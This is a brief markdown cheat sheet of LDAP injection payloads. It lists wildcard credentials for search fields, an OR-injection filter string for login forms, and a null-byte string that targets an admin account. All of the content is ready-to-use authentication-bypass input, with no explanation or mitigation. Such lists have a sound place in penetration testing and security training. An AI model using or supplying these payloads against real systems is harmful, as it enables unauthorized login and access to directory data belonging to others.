# LDAP Injection

## Wildcard (most likely in search functionality)
```
username: *
password: *
```
## OR injection (most likely in login)
```
username: *)(uid=*))(|(uid=*
password: any
```

## Comment / null byte style
```
username: admin)(cn=*))%00
password: any
```